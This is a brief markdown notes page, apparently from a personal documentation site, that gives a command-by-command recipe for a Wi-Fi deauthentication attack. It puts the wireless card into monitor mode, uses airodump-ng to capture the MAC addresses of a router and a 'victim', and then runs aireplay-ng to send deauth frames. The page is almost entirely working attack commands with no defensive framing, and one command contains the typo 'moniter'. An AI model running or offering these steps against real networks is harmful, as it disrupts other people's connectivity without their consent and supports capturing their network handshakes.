---
title: Deauth
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: ""
  description: ""
  canonical: ""
  robots: ""
  noindex: false
---
Stoping NetworkManager:

```sh
systemctl stop NetworkManager
```

Stop wifi card  and put your card in monitor mode : 

```sh
ifconfig wlp0s20f3 down
iwconfig wlp0s20f3 mode moniter
ifconfig wlp0s20f3 up 
```

- Capture mac address with AiroDump : 
```sh
airodump-ng -c 1 wlp0s20f3 
```

Grab the mac address of the router and the victim .
- Deauth command : 

```sh
aireplay-ng --deauth 10 -a WIFI -c target wlp0s20f3
```